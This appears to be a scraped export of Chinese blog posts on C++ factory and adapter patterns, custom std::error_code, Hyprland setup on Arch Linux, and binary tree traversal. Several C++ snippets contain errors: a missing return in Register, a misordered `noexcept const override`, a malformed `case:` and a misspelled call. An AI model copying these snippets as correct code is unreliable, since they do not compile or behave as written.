接下来就是简单的注册和获取角色，还是同样使用 is_base_of_v 限制继承关系，下面函数添加到 Factory 类中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 注册产品 template\u003ctypename CP\u003e requires std::is_base_of_v\u003cP, CP\u003e std::error_code Register(const std::string\u0026 name) { if (name.empty()) { // 名称不能为空，返回对应错误，不是这里的空！ return {}; } _map[name] = []() -\u003e P* { return new CP(); }; } // 获取产品 P* Get(const std::string\u0026 name) { auto it = _map.find(name); if (it == _map.end()) { // 产品为空，建议参数加一个error_code return nullptr; } return it-\u003esecond(); } 上面两段代码需要注意不是线程安全！如果多线程下使用，需要加锁，同时单例模式这里选择了最简单的使用时初始化。\n在使用产品之前统一进行注册，之后就能使用相同的API进行对象构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void test_simple_factory() { // 注册 Factory\u003cAbstractRole\u003e::Instance().Register\u003cGeneralThunderboltRole\u003e(\"雷电将军\"); Factory\u003cAbstractRole\u003e::Instance().Register\u003cTravelerRole\u003e(\"旅行者\"); Factory\u003cAbstractMonster\u003e::Instance().Register\u003cAbyssalMageMonster\u003e(\"深渊法师\"); AbstractRole* role1 = Factory\u003cAbstractRole\u003e::Instance().Get(\"雷电将军\"); if (role1) { role1-\u003eshow(); delete role1; } AbstractRole* role2 = Factory\u003cAbstractRole\u003e::Instance().Get(\"旅行者\"); if (role2) { role2-\u003eshow(); delete role2; } AbstractMonster* monster = Factory\u003cAbstractMonster\u003e::Instance().Get(\"深渊法师\"); if (monster) { monster-\u003eshow(); delete monster; } } 上面的注册模板工厂解决了模板方法工厂的接口统一问题，不过却引入了相应的运行时开销，以及多线程下的锁开销，使用时可以根据实际情况决定。\n总结 本文由简单到复杂介绍了常见的几种工厂模式，在C++中，前几种模式用得很少，一般使用最后两种，配合模板可以实现更强大和方便的代码。\n注册模板工厂统一了接口，代码更加优雅，甚至可以使用不同产品名称构造同一种产品，但是需要注意多线程下的数据同步问题，模板方法工厂接口没有统一，但是少了很多运行时开销。\n以上所有示例代码都没有解决对象构造函数参数不同的问题，使用场景有限，所有生成的对象都是指针，需要手动管理，且存在虚函数运行时开销。\n","description":"","tags":["笔记","设计模式"],"title":"C++设计模式笔记，工厂模式","uri":"/posts/id/362316/"},{"categories":["posts"],"content":"引言 本文开始之前，先来看看 《图解设计模式》中的一个例子，非常形象的说明了适配器模式在软件设计中的作用。\n现在有一台笔记本电脑，电池充电需要的是直流 12 伏特电压，而家用一般都是 220伏特的交流电，无论哪一边，其接口都已经很稳定，不会做更改，现在就需要使用 220V 交流电给 12V 直流工作电压的电池充电，通常我们会使用 AC适配器，将交流电转为直流电，同时调整电压。看到这里，适配器的作用已经很明显了。\n对应到软件设计中，就是用于填补==现有的程序==和==所需的程序==之间的差异，解决原有类已经有特定功能，但是接口不符合，使用适配器解决。\n使用 考虑到下面的场景：\n我们有一个接口 ConfigApi ，里面包含了两个函数，分别用于从配置文件解析配置和保存配置到文件，定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // C++11 error_code #include \u003csystem_error\u003e // C++17 文件系统 #include \u003cfilesystem\u003e // 配置文件操作的API class ConfigApi { public: // 解析配置 virtual std::error_code parseConfig() = 0; // 保存配置 virtual std::error_code saveConfig() = 0; // 获取配置文件中值 virtual std::string getValue(const std::string\u0026 key) = 0; // 设置配置文件中的值 virtual void setValue(const std::pair\u003cstd::string, std::string\u003e\u0026 pair) = 0; }; 这个配置文件解析非常复杂，可以使用第三方库快速解析，第三方库有解析配置和保存配置的类，但是与接口不符合，定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u003cfilesystem\u003e #include \u003csystem_error\u003e // 第三方库内的配置类 class FileConfig { public: explicit FileConfig(std::filesystem::path\u0026\u0026 p) : _path(p) {} public: // 解析配置 std::error_code parse() { // 具体实现 return {}; } // 保存配置 std::error_code save() { // 具体实现 return {}; } // 其他方法 . . . private: // 配置文件路径 std::filesystem::path _path; }; 如果要利用第三方库的类来实现我们的接口，有两种不同方法可以实现：\n利用C++多继承，同时继承 FileConfig 和 ConfigApi ，然后利用父类实现接口中的功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 适配类器类 class MyConfig : public FileConfig, public ConfigApi { public: explicit MyConfig(std::filesystem::path\u0026\u0026 p) noexcept : FileConfig(std::move(p)) {} public: std::error_code parseConfig() override { return parse(); } std::error_code saveConfig() override { return save(); } std::string getValue(const std::string \u0026key) override { // 利用父类其他方法实现 return \"\"; } void setValue(const std::pair\u003cstd::string, std::string\u003e \u0026pair) override { // 利用父类方法实现 } }; 不继承第三方库中类(适用与第三方库中类声明为 final ，不允许继承)，在接口派生类中包含一个第三方库中类的对象，然后利用这个对象委托完成接口函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 适配类器类 class MyConfig : public ConfigApi { public: explicit MyConfig(std::filesystem::path\u0026\u0026 p) noexcept : _config(std::move(p)) {} public: std::error_code parseConfig() override { return _config.parse(); } std::error_code saveConfig() override { return _config.save(); } std::string getValue(const std::string \u0026key) override { // 利用 _config 其他方法实现 return \"\"; } void setValue(const std::pair\u003cstd::string, std::string\u003e \u0026pair) override { // 利用 _config 方法实现 } private: FileConfig _config; }; 第三方库中类一般都是很稳定的，如果之间修改其中的类非常不现实，出了问题维护起来也很麻烦，而使用适配器，就可以将错误定位在我们自己定义的适配器内，而且第三方库中接口一般不会变，不改变第三方库也方便后期对第三方库进行升级。\n总结 适配器主要用在已有类或代码已经稳定，但是接口不兼容的情况下，需要两个功能差距不大的，不可能用水龙头给电池充电吧！\n通过适配器还能在代码版本升级后通过适配器适配低版本代码，实现兼容升级。\n","description":"","tags":["笔记","设计模式"],"title":"C++设计模式笔记，适配器模式","uri":"/posts/id/361153/"},{"categories":["posts"],"content":"前段时间在熟悉 C++17 的文件系统，看到很多函数都传入或者返回一个类型，也就是这篇文章要讨论的对象：std::error_code 。\n根据 Cppreference 介绍，error_code 是一个依赖于平台的错误代码，每个对象包含一个源于操作系统或低级接口的错误代码，还有一个指向 std::error_category 类型对象的指针。并且在不同错误类型中，错误代码值可能不是唯一 。\n这样看来C++提供的这个 error_code 好像并不能开箱即用，目前还不清楚依赖平台的错误代码，而且这个 error_category 对象的指针如何处理我们也不知道。但是联系 Linux 下面 api 的错误处理就好理解了。在 Linux 平台编程进行系统编程时，经常会对一些函数的返回值进行判断，比如 等于 0 为无错误，小于 0 时判断 errno 的值，再根据 errno 的值进行相应的错误处理。而我们平时编程时，也会在某些地方定义一个错误类型的枚举，然后根据枚举类型值进行相应错误处理 。\n这里的错误代码就对应我们平时使用的错误枚举，而错误类别就可以方便我们将错误进行分类，比如网络编程中 HTTP 协议处理中的错误和 Websocket 协议中的错误可以使用不同的类别，但是错误代码可以相同，比如错误代码 1 都代表读取数据失败，这样就方便我们排查错误的来源，统一错误处理。\n首先来看看标准库中 error_code 的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 class error_code { public: // 可以看到默认构造函数的错误代码对应0，错误类别为系统错误 error_code() noexcept : _M_value(0), _M_cat(\u0026system_category()) { } // 这里提供了 (错误代码，错误类别对象指针) 的构造方法 error_code(int __v, const error_category\u0026 __cat) noexcept : _M_value(__v), _M_cat(\u0026__cat) { } // 这里提供了从错误代码枚举转换的构造函数，但是对错误枚举有一定限制： // 不过要求 std::is_error_code_enum\u003cT\u003e::value 为true，默认为： // template\u003ctypename _Tp\u003e struct is_error_code_enum : public false_type { }; template\u003ctypename _ErrorCodeEnum, typename = typename enable_if\u003cis_error_code_enum\u003c_ErrorCodeEnum\u003e::value\u003e::type\u003e error_code(_ErrorCodeEnum __e) noexcept { *this = make_error_code(__e); } void assign(int __v, const error_category\u0026 __cat) noexcept { _M_value = __v; _M_cat = \u0026__cat; } // 清除错误 void clear() noexcept { assign(0, system_category()); } // DR 804. template\u003ctypename _ErrorCodeEnum\u003e typename enable_if\u003cis_error_code_enum\u003c_ErrorCodeEnum\u003e::value, error_code\u0026\u003e::type operator=(_ErrorCodeEnum __e) noexcept { return *this = make_error_code(__e); } // 返回错误代码 int value() const noexcept { return _M_value; } // 返回错误类别的引用 const error_category\u0026 category() const noexcept { return *_M_cat; } error_condition default_error_condition() const noexcept; // 返回错误类别对应的错误消息，错误代码不需要我们手动传递 _GLIBCXX_DEFAULT_ABI_TAG string message() const { return category().message(value()); } // 判断错误代码是否为 0，true 为有错误 explicit operator bool() const noexcept { return _M_value != 0; } // DR 804. private: int _M_value; const error_category* _M_cat; }; 上面提到我们经常使用的是错误枚举，所以要构造 error_code 就需要从第三个构造函数入手，默认的 is_error_enum 的定义是：template\u003ctypename _Tp\u003estruct is_error_code_enum : public false_type { }; ，所以我们可以使用模板特化让我们自定义的类型能使用构造函数：\n1 2 3 4 5 6 7 8 // 假设这是我们自定义的错误枚举 enum class HttpErrorCode; // 使用 std 命名空间是因为标准库内代码作用域是std namespace std { // 特化我们的类型 template\u003c\u003e struct is_error_code_enum\u003cHttpErrorCode\u003e : public true_type{ }; } 光满足这个还不够，上面代码中使用的是：*this = make_error_code(__e); 来构造，还需要实现 make_error_code() ，因为标准库中并没有 make_error_code(HttpErrorCode __e) 这个函数，我们自己定义一个即可：\n1 2 3 4 std::error_code make_error_code(HttpErrorCode __e) { return ???; } 这里需要返回一个 error_code ，？怎么又绕回来了，不急，现在就需要使用第二个构造函数，也就是提供错误代码和错误类别的函数来构造，参数的 HttpErrorCode 枚举类实际数字，我们可以强行进行转换为 int 类型，但是错误类别我们目前还不清楚。还是一样的方法，看看标准库怎么定义的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 class error_category { public: constexpr error_category() noexcept = default; virtual ~error_category(); error_category(const error_category\u0026) = delete; error_category\u0026 operator=(const error_category\u0026) = delete; virtual const char* name() const noexcept = 0; // We need two different virtual functions here, one returning a // COW string and one returning an SSO string. Their positions in the // vtable must be consistent for dynamic dispatch to work, but which one // the name \"message()\" finds depends on which ABI the caller is using. // 这里需要两个不同的虚拟函数，一个返回COW字符串， // 另一个返回SSO字符串。它们在vtable中的位置必须一致，动态分派才能正常工作， // 但“message（）”名称找到哪一个取决于调用者使用的ABI。 #if _GLIBCXX_USE_CXX11_ABI private: _GLIBCXX_DEFAULT_ABI_TAG virtual __cow_string _M_message(int) const; public: _GLIBCXX_DEFAULT_ABI_TAG virtual string message(int) const = 0; #else virtual string message(int) const = 0; private: virtual __sso_string _M_message(int) const; #endif public: virtual error_condition default_error_condition(int __i) const noexcept; virtual bool equivalent(int __i, const error_condition\u0026 __cond) const noexcept; virtual bool equivalent(const error_code\u0026 __code, int __i) const noexcept; bool operator==(const error_category\u0026 __other) const noexcept { return this == \u0026__other; } #if __cpp_lib_three_way_comparison strong_ordering operator\u003c=\u003e(const error_category\u0026 __rhs) const noexcept { return std::compare_three_way()(this, \u0026__rhs); } #else bool operator!=(const error_category\u0026 __other) const noexcept { return this != \u0026__other; } bool operator\u003c(const error_category\u0026 __other) const noexcept { return less\u003cconst error_category*\u003e()(this, \u0026__other); } #endif }; 上面注释解释以及很清楚了，std::error_category 实际是一个抽象类，提供了两个虚函数 const char* name() 和 std::string message(int) 。这很明显是留给用户继承用的，上面提到 error_code 由一个错误代码( int类型 )和一个指向错误类别对象的指针组成，而这个指针加上虚函数正好实现错误类别的多态，因为对象本身无法正确调用用户继承的类的函数，只有指针和引用才行，而指针更加灵活。\n所以如果需要构造 error_code 我们就需要定义一个错误类别，并继承自 std::error_category 类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 struct HttpErrorCategory : public std::error_category { // 实现两个虚函数 // 返回类别的名称 const char* name() noexcept const override { return \"HttpProtocolError\"; } // 根据错误代码返回对应的错误信息 std::string message(int error_code) const override { switch (static_cast\u003cHttpErrorCode\u003e(error_code)) { case: HttpErrorCode::xxx: return \"xxx\"; default: return \"xxxx\"; } } } 上面提到，error_code 的错误代码值可能不唯一，但是要正确的错误就必须保证错误是唯一的，错误代码不唯一，那错误类别就必须唯一，而保证一个程序内对象唯一，使用一个全局静态变量或者像标准库中一样定义一个函数，返回全局静态对象即可：\n1 2 3 4 5 const std::error_category\u0026 global_http_error_category() { static const HttpErrorCategory g_http_error_category{}; return g_http_error_category; } 现在所有对象都解决了，只需要完善 make_error_code() 函数即可：\n1 2 3 4 std::error_code make_error_code(HttpErrorCode code) { return { static_cast\u003cint\u003e(code), global_http_error_category() }; } 使用起来就很简单了：\n1 2 3 4 5 6 7 8 9 10 // ... int main() { // operatoe =() -\u003e make_error_code() std::error_code err = HttpErrorCode::NoReadData; if (err) { std::cout \u003c\u003c err.category().name() \u003c\u003c \": \" \u003c\u003c err.message() \u003c\u003c \"\\n\"; } return 0; } 总结： 如果需要使用自定义的 error_code ，可以使用一下步骤完成：\n定义自己的错误枚举类(强枚举) 将自己的枚举类型于 error_code 关联，即 template\u003c\u003estruct is_error_code_enum\u003c你的枚举类型\u003e : public std::true_type{}; ，注意在 std 名称空间。 定义自己的错误类别，继承自 std::error_category 并实现两个接口： const char* name() noexcept const override std::string message(int) const override 定义一个函数，用于返回 自定义错误类别全局对象的不可变引用：const std::error_category\u0026 xxx() 。 自定义函数 std::error_code make_error_code(ErrorCodeEnum code) 构造 std::error_code 。 愉快使用 std::error_code 。 ","description":"","tags":["Code","C++标准库"],"title":"使用C++ error_code","uri":"/posts/id/37usnd1/"},{"categories":["posts"],"content":" 最近突然发现 Fxitc5 可以在 Wayland 下输入中文了，这样下来就有很多软件可以不用 Xwayland ,进一步过渡到 Wayland ，由于目前配置 Wayland 还是比较麻烦的，所以写这篇文章记录一下。\n配置镜像并安装AUR工具 官方镜像在国内速度和不理想，所以必须先进行换源，目前国内源常用的是 清华镜像站 、阿里镜像站 、华为镜像站 等。这些镜像站背景都比较大，是比较稳定的选择。\n使用文本编辑器( nano、vim、nvim 等)编辑 /etc/pacman.d/mirrorlist 文件，添加以下内容到第一个 Server 行上一行：\n1 2 3 4 5 6 # 华为镜像站 Server = https://repo.huaweicloud.com/archlinux/$repo/os/$arch # 阿里镜像站 Server = https://mirrors.aliyun.com/archlinux/$repo/os/$arch # 清华镜像站 Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 在国内还有一个 archlinuxcn 源是经常用的，可以添加到 /etc/pacman.conf 尾部：\n1 2 3 4 5 [archlinuxcn] # 阿里archlinuxcn源 Server = https://mirrors.aliyun.com/archlinuxcn/$arch # 清华archlinuxcn源 # Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch 配置好之后记得使用 sudo pacman -Suyy 更新系统，如果配置了 archlinuxcn 源还需要使用 sudo pacman -S archlinuxcn-keyring 导入信任密钥，不然安装 archlinuxcn 源的软件会校验不成功。\n强烈建议开启 pacman 的颜色和多线程下载功能，编辑 /etc/pacman.conf 文件，将对应位置前 # 删除即可：\n1 2 3 4 5 6 7 8 ... #UseSyslog Color #NoProgressBar CheckSpace #VerbosePkgLists ParallelDownloads = 4 ... Archlinux 好用的一个原因就是拥有 AUR 仓库，里面收录了很多的软件包，涵盖日常使用的方方面面！AUR仓库中的软件基本都使用 PKGEBUILD 文件进行配置安装，如果每一个包都手动下载再安装很麻烦，需要选择一个好用的 AUR 工具。最常用的便是 yay 了，不过最近看到了一个用 Rust 写的 AUR 工具 paru ，同 yay 使用差不多，不过可以在安装前查看 PKGEBUILD 文件，可以在一定程度上防止恶意软件吧。\nyay 可以直接通过之前配置的 archlinuxcn 源进行安装：sudo pacman -S yay 。paru 安装也很简单:\n1 2 3 4 sudo pacman -S --needed base-devel git clone https://aur.archlinux.org/paru.git cd paru makepkg -si 安装Wayland 首先使用以下命令安装Wayland所需环境，如果需要兼容 xorg 软件记得加上 xorg-xwayland 软件包：\n1 sudo pacman -S xorg-xwayland qt5-wayland qt6-wayland glfw-wayland 要查看当前有哪些客户端是使用 xorg 的，可以安装 xorg-xlsclients 然后查看：\n1 2 3 sudo pacman -S xorg-xlsclients # 查看 xlsclients 安装 Hyprland Hyprland 是 Wayland 环境下的一个很棒的合成器，支持窗口透明、模糊、圆角、插件和动画效果等，不过目前还没有发布正式稳定版，所以很多发行版都没有上架，目前支持的发行版在官方安装教程里面列出了：Hyprland Installation 。虽然没有发布稳定版，但是日常使用已经没有什么问题了。\n如果安装了 AUR 工具，那么可以直接进行安装，不用自己配置：paru -S hyprland-bin 。这里演示一下源码安装：\n安装依赖 1 paru -S gdb ninja gcc cmake meson libxcb xcb-proto xcb-util xcb-util-keysyms libxfixes libx11 libxcomposite xorg-xinput libxrender pixman wayland-protocols cairo pango seatd libxkbcommon xcb-util-wm xorg-xwayland libinput 下载源码 1 git clone --recursive https://github.com/hyprwm/Hyprland 编译安装 1 2 3 4 cd Hyprland meson _build ninja -C _build ninja -C _build install 复制配置文件 安装好 Hyprland 后记得复制配置文件到用户文件夹：\n1 2 3 4 5 6 mkdir -pv ~/.config/hypr # 如果是 AUR 安装 sudo cp /usr/share/hyprland/hyprland.conf ~/.config/hypr/ # 如果是源码安装 sudo cp /usr/local/share/hyprland/hyprland.conf ~/.config/hypr # 配置文件内都有详细注释，虽然全是英文～ 配置登录启动 此处配置适用于不使用登录服务器的，如果使用登录服务器请参考 登录服务器启动Hyprland 。\n由于使用 Wayland ，所以就不能像 Xorg 下使用 startx 快速启动桌面环境了，我一般手动登录后，输入 start_hyprland 进行桌面环境，首先编辑 ~/.bash_profile 文件，如果使用 fish 、zsh 等请参考其配置文件名称：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 # 启动 wayland 桌面前设置一些环境变量 function set_wayland_env { cd ${HOME} # 设置语言环境为中文 export LANG=zh_CN.UTF-8 # 解决QT程序缩放问题 export QT_AUTO_SCREEN_SCALE_FACTOR=1 # QT使用wayland和gtk export QT_QPA_PLATFORM=\"wayland;xcb\" export QT_WAYLAND_DISABLE_WINDOWDECORATION=1 # 使用qt5ct软件配置QT程序外观 export QT_QPA_PLATFORMTHEME=qt5ct # 一些游戏使用wayland export SDL_VIDEODRIVER=wayland # 解决java程序启动黑屏错误 export _JAVA_AWT_WM_NONEREPARENTING=1 # GTK后端为 wayland和x11,优先wayland export GDK_BACKEND=\"wayland,x11\" } # 命令行输入这个命令启动hyprland,可以自定义 function start_hyprland { set_wayland_env export XDG_SESSION_TYPE=wayland export XDG_SESSION_DESKTOP=Hyprland export XDG_CURRENT_DESKTOP=Hyprland # 启动 Hyprland程序 exec Hyprland } 常用软件安装和启用 现在直接进入 Hyprland 环境你会发现什么东西都没有，不用着急，下面的内容就是补全这些内容，让你使用起来更方便。\n配置壁纸 进入桌面最先看到的应该是壁纸才对，Sway 是个很好的窗口管理器，不仅是它好用，还有它提供的一套好用的类似 i3 的软件包，比如配置壁纸就可以使用 swaybg 。\n使用命令行安装 swaybg 然后在 Hyprland 配置文件中启动（窗口管理器不像桌面环境，很多软件都需要我们手动启动，好在 Hyprland提供了启动这些软件的方法）：\n1 2 3 4 5 6 7 # 安装 swaybg sudo pacman -S swaybg # 编辑 ~/.config/hypr/hyprland.conf 文件 #--------------------------------------- $wallpaper_path=\u003c你放壁纸的完整路径\u003e exec-once=swaybg -i $wallpaper_path -m fill #--------------------------------------- exec-once 表示我们只需要在 Hyprland 启动的时候执行，在每次保存配置文件后，Hyprland 会自动读取配置，如果要每次配置完都执行，可以使用 exec 。如果要配置随机壁纸，请将壁纸放在一个文件夹下，然后替换上面的配置为：\n1 2 $wallpaper_dir=\u003c你存放壁纸的目录\u003e exec-once=swaybg -i $(find $wallpaper_dir -type f | shuf -n 1) -m fill 配置顶栏 这个顶栏很好理解，用来显示系统的一些信息，比如工作区、网络、声音、亮度、电量、系统托盘等。wayland 下可以使用 waybar ，支持很多模块显示，不过官方版本对 Hyprland 的工作区有点问题，建议安装 AUR 上对工作区进行修复的版本：\n1 2 3 4 # 安装官方版本 sudo pacman -S waybar # 安装 Hyprland 工作区修复版本 paru -S waybar-hyprland waybar 配置文件在 ~/.config/waybar 目录下的 config.json 和 style.css 文件，如果自己不会配置可以在 Github 上搜索 waybar theme 使用别人配置好的，篇幅原因这里不进行介绍。\n配置文件弄好后还需要在 Hypeland 配置文件中启动：exec-once=waybar 。\n软件启动器 桌面环境下，我们可以点击桌面图标和软件菜单启动程序，wayland 窗口管理器下一般使用 bmenu 或者 rofi，rofi 更加美观，推荐使用，不过需要使用经过修复的 rofi ，否则无法正常工作，使用 AUR 安装：paru -S rofi-lbonn-wayland-only-git 。其配置文件位于 ~/.config/rofi/ 目录下，美化不进行介绍，可以参考 waybar 方法在 Github 上查找。\n在 hyprland 配置文件中绑定快捷键即可：\n1 2 $menu=rofi -show drun bind = SUPER, R, exec, $menu 通知守护程序 平时使用，接收通知是必须的，wayland 下可以使用 dunst、mako 等守护程序：\n1 2 3 4 5 6 # 安装 mako sudo pacman -S mako # hyprland 配置 #-------------------- exec-once=mako #-------------------- 如果需要使用命令行发送通知，可以安装 toastify ，之后使用 notify-send \"通知内容\" 可以发送通知。\n复制与粘贴 剪切板管理工具也经常用到，wayland 下可以使用 clipman(只能管理文字) 或 cliphist(文字加图片) ：\n1 2 3 4 5 6 paru -S cliphist wl-clipboard # 基本使用方法 # 拷贝 echo \"Hello World\" | wl-copy # 粘贴 wl-paste 在配置文件里启用：\n1 2 3 4 5 6 7 # 这个会自动监控剪切板，然后将复制的内容保存到本地数据库中。 exec-once=wl-paste --type text --watch cliphist store exec-once=wl-paste --type image --watch cliphist store # 在一个软件内复制，这软件关闭后无法进行粘贴，需要配置快捷键显示剪切板历史 bind=SUPER_SHIFT, V, exec, cliphist list | rofi -dmenu | cliphist decode | wl-copy # 内容太多记得手动删除哟，cliphist每提供一键删除，必须差评！ for i in $(cliphist list | awk -F. '{ print $2 }'); do cliphist delete-query \"$i\"; done 截屏与录屏 如果需要进行屏幕录制或者直播，pipewire 是必须的：\n1 sudo pacman -S pipewire wireplumber slurp grim grim 可以截取屏幕，slurp 可以选择一块区域，两者配合可以进行区域截图，在配置文件内使用：\n1 2 3 4 5 6 7 8 9 10 11 12 #---------------快捷键 $mainMod=SUPER $shiftMod=SUPER_SHIFT $altMod=SUPER_ALT $alt=ALT $shift=SHIFT #---------------------绑定快捷键操作 $screen_file=${HOME}/Pictures/ScreenShot/screen_shot_$(date + \"%Y-%m-%d_%H-%M-%S\").png bind=$shiftMod, S, exec, grim -g \"$(slurp)\" - | wl-copy bind=, Print, exec, grim $screen_file bind=$shift, Print,exec, grim -g \"$(slurp)\" $screen_file bind=$alt, Print, exec, grim - | wl-copy 录屏可以使用 obs-studio ，不多介绍。\n用户认证软件 很多时候我们打开软件都不需要 root 权限，不过有些特殊的软件需要使用 root 权限，不过在桌面启动时无法认证并获得权限，这就需要一个图形化的认证程序，KDE 旗下的 polkit-kde-agent 是个不错的选择：\n1 2 3 4 5 6 7 sudo pacman -S polkit-kde-agent # hyprland 配置文件内 #----------------------- exec-once=/usr/lib/polkit-kde-authentication-agent-1 # 使用体验，对认证程序采用浮动窗口 windowrulev2=float, class:^(.*polkit-kde.*)$ #----------------------- 移动磁盘挂载 Linux 下可移动磁盘不会自动挂载，特别是在窗口管理器环境下。使用 udiskie 可以自动进行挂载，非常方便：\n1 2 3 sudo pacman -S udiskie # 配置文件内启用 exec-once=udiskie \u0026 字体推荐 字体我这里推荐 Maple 和 Nerd ，一个中文编程字体，一个图标字体。下载字体放到 ~/.local/share/fonts/ 或者 /usr/share/fonts/ 下，然后进入目录使用 mkfontdir 和 mkfontscale 生产字体配置然后使用 sudo fc-cache -f -v 刷新字体缓存。\n输入法 毫无疑问，无脑使用 Fcitx5 就完了，安装基本输入法和中文输入法：\n1 sudo pacman -S fcitx5-im fcitx5-pinyin-zhwiki 编辑 /etc/environment 文件配置环境变量：\n1 2 3 4 GTK_IM_MODULE=fcitx5 QT_IM_MODULE=fcitx5 SDL_IM_MODULE=fcitx5 XMODIFIERS=@im=fcitx5 注意：~/.pam_environment 文件已经不再使用！！！\n注意：~/.pam_environment 文件已经不再使用！！！\n注意：~/.pam_environment 文件已经不再使用！！！\n在 hyprland 中启动：\n1 exec-once=fcitx5 --replace -d 其他设置 Electron 软件如果需要使用 wayland 启动，需要在启动参数中加入：--enable-features=UseOzonePlatform --ozone-platform=wayland ，如果希望所有Electron软件（仅限使用系统electron的软件，不包括使用自己版本的软件）都这样启动，可以编辑 ~/.config/electron-flags.conf 文件，加入：\n1 2 --enable-features=UseOzonePlatform --ozone-platform=wayland XWayland 软件字体大小可能与 wayland 不同，可以编辑 ~/.Xresources 文件：\n1 2 3 4 5 6 Xft.dpi: 96 Xft.autohint: 0 Xft.lcdfilter: lcddefault Xft.hintstyle: hintfull Xft.hinting: 1 Xft.rgba: rgb 然后使用 xrdb ~/.Xresources 加载配置，建议加在 Hyprland 配置文件内，每次启动都执行一次。\n最后 Wayland 发展越来越好，也希望早点取代 Xorg 吧，毕竟这个软件太老了！\n","description":"","tags":["Linux","日常","Wayland","折腾"],"title":"Arch Linux下Hyprland配置","uri":"/posts/id/37hugsk/"},{"categories":["posts"],"content":"树的基本概念 树是有 n(n\u003e=0)个节点的有限集合，n=0 时为 空树 ，在一颗非空的树中有且仅有一个根节点，当 n \u003e 1 时，其余节点可以分为 m (m \u003e 0) 个互不相交的有限集合，其中每个集合又是一颗树，并称为根的子树。\n节点的子树的根称为该节点的孩子，该节点称为其孩子的双亲，同一节点的孩子之间互称为兄弟。\n节点的祖先是从根节点到该节点途径的所有节点。\n节点拥有的子树数目称为节点的度，度为 0 的节点称为叶子节点(终端节点) ，度不为0的节点称为分支节点(非终端节点) ，除根节点外，非终端节点又称为内部节点，树的度是各节点度的最大值。\n以某节点为根的子树中任一节点都是该节点的子孙。\n节点的层次是从根节点开始算起，根为第一层，其孩子为第二层，依次类推。树中最大层树即为树的深度。\n双亲在同一层的节点互称为堂兄弟。\n如果子树从左到右是有次序的，则称此树为有序树，反之为无序树。\n二叉树 二叉树是 n(n\u003e=0) 个节点的有限集合，n=0 时称为空二叉树，由一个根节点和两根互不相交，分别称为根节点左子树、右子树的两颗二叉树组成。\n特点 每个节点_最多_两颗子树，不存在大于 2 个度的节点。 子树具有顺序，分为左子树和右子树。 分类 二叉树根据形态可以分为以下不同树：\n斜树\n所有节点都在同一边，比如左斜树所有节点只有左子树，树退化为链表这类线性结构。\n满二叉树\n所有节点都有左右子树（除了叶子节点），且所有叶子节点在同一层。\n其叶子节点只在最下一层，非叶子节点度一定为 2 ，同样深度的一颗二叉树，满二叉树节点最多，叶子节点最多。\n完全二叉树\n一颗具有 n 个节点的二叉树，从根节点开始编号，编号为 i (1 \u003c= i \u003c= n)的节点位置与节点数相同的满二叉树中编号为 i 的节点一样，则称为完全二叉树。\n特点：\n叶子节点只能在最下两层。 最下层叶子一定集中在左部连续位置。倒数第二层叶子节点一定集中在右部连续位置。 若节点度数为 1 ，一定只有左孩子。 同样节点数的二叉树，完全二叉树深度最小。 具有 n 个节点的完全二叉树，其深度为 $log_{2}^{n} + 1$ 。 二叉树的性质 二叉树第 i(i\u003e=0) 层上，至多有 $2^{i-1}$ 个节点。 深度为 k (k\u003e=1) 的二叉树，至多有 $2^k - 1$ 个节点。 在有 n 个节点的二叉树中，若叶子节点数为 $n_0$ ，度为 2 的节点数为 $n_2$ ，则 $n = n_0 + n_2$ 。 二叉树的遍历 按照访问节点的顺序可以将方法分为以下几种：\n前序遍历\n步骤：若树为空，则直接返回，否则先访问当前节点，然后用同样的前序遍历方法遍历该节点左子树，然后前序遍历该节点右子树。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // 递归方式 void front_visit(TreeNode* node) { if (nullptr == node) { return; } // 访问节点 visit(node); // 前序遍历左节点 fron_visit(node-\u003eleft); // 前序遍历右节点 front_visit(node-\u003eright); } // 非递归方式，用用户栈模拟函数栈 void front_visit(TreeNode* node) { if (nullptr == node) { return; } stack\u003cTreeNode*\u003e s; // 根节点入栈 s.push(node); while (!s.empty()) { auto n = s.top(); s.pop(); // 前序遍历，先访问节点 visit(n); // 右子树后访问，先入栈 if (n-\u003eright) { s.push(n-\u003eright); } // 左子树先访问，后入栈 if (n-\u003eleft) { s.push(n-\u003eleft); } } } 中序遍历\n步骤：若树为空，直接返回，否则从根节点开始先中序遍历左子树，然后访问根节点，最后中序遍历右子树。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // 递归方式 void middle_visit(TreeNode* node) { if (nullptr == node) { return; } middle_visit(node-\u003eleft); visit(node); middle_visit(node-\u003eright); } // 非递归方式 void middle_visit(TreeNode* node) { if (nullptr == node) { return; } stack\u003cTreeNode*\u003e s; auto n = node; while (!s.empty() || n) { // 节点不为空，如果左子树遍历完成，节点也是空，则一直入栈其左孩子 while (nullptr != n) { s.push(n); n = n-\u003eleft; } // 此时左子树入栈完成，开始访问 if (!s.empty()) { n = s.top(); s.pop(); visit(n); // 遍历右子树，如果为空，上面循环不会再入栈 n = n-\u003eright; } } 